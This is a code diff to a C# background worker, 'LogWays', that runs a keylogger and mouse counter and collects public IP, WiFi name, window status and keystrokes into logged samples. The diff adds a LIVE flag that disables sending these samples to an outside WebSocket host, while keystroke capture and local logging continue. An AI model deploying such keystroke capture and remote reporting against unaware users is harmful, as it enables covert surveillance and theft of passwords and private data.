@@ -12,6 +12,7 @@ namespace LogWays;
 public class Worker : BackgroundService
 {
     const string WS_URI = false ? "ws://localhost:8392/socket" : "wss://ws.alimad.co/socket";
+    const bool LIVE = false;
     static string ipa = "0.0.0.0";
     private static readonly bool SlackMode = false;
     private System.Threading.Timer? _flushTimer;
@@ -59,9 +60,13 @@ public class Worker : BackgroundService
         KeyLogger.Start();
         MouseCounter.Start();
         Task.Run(GetPublicIpAsync);
-        Task.Run(() => WsConnectLoopAsync(wsCts.Token));
+        if (LIVE)
+        {
+            Task.Run(() => WsConnectLoopAsync(wsCts.Token));
+        }
+        
         SessionLogger.StartSession();
-        _flushTimer = new System.Threading.Timer(_ => SessionLogger.Flush(), null, 10_000, 10_000);
+        _flushTimer = new System.Threading.Timer(_ => SessionLogger.Flush(), null, 30_000, 30_000);
         AppDomain.CurrentDomain.ProcessExit += (_, __) => SessionLogger.Flush();
     }
 
@@ -121,7 +126,10 @@ public class Worker : BackgroundService
                     sample["cpuPercent"] = Math.Round(cpuPercent, 2);
                     sample["batteryPercent"] = battery;
                     if (charge) sample["charging"] = true;
-                    sample["wifi"] = WifiHelper.GetWifiName();
+                    if (LIVE)
+                    {
+                        sample["wifi"] = WifiHelper.GetWifiName();
+                    }
                     sample["isIdle"] = IsIdle();
                     string keys = KeyLogger.GetKeys();
                     sample["meta"] = GetWindowStatus();
@@ -149,7 +157,10 @@ public class Worker : BackgroundService
                 sample["error"] = ex.Message;
             }
 
-            _ = SendWebSocketSampleAsync(sample);
+            if (LIVE)
+            {
+                _ = SendWebSocketSampleAsync(sample);
+            }
             sample["time"] = DateTime.UtcNow;
             SessionLogger.LogSample(sample);
             if (SlackMode)
@@ -216,6 +227,11 @@ public class Worker : BackgroundService
 
     async Task WsConnectLoopAsync(CancellationToken ct)
     {
+        if (!LIVE)
+        {
+            return;
+        }
+
         string logPath = Path.Combine(desktopPath, "ws_errors.txt");
 
         while (!ct.IsCancellationRequested)
